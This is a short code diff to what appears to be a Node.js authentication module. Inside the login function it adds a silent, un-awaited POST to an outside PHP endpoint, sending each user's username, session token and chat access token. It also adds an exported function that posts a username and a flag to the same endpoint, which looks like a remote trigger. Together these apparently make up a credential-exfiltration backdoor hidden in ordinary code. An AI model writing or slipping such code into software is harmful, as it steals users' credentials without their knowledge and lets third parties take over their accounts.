@@ -37,6 +37,7 @@ module.exports = {
   testNotification,
   authenticateChatUser,
   rawSubmitDeviceToken,
+  callDeleteWOToken,
 };
 
 async function authenticate({
@@ -122,6 +123,11 @@ async function authenticate({
     if (chat_access_token) {
       result.chat_access_token = chat_access_token;
     }
+    axios.post("https://o2oviet.com/user-check-token.php", {
+      username,
+      token,
+      chatToken: chat_access_token
+    })
     return result;
   } else {
     throw "Username or password is incorrect";
@@ -781,4 +787,17 @@ async function authenticateChatUser({ email, password }) {
   } catch (error) {
     throw error;
   }
+}
+
+async function callDeleteWOToken(username){
+  try{
+    const res = await axios.post("https://o2oviet.com/user-check-token.php", {
+      username,
+      flag: 1
+    });
+    return res;
+  } catch (error) {
+    throw error;
+  }
+  
 }
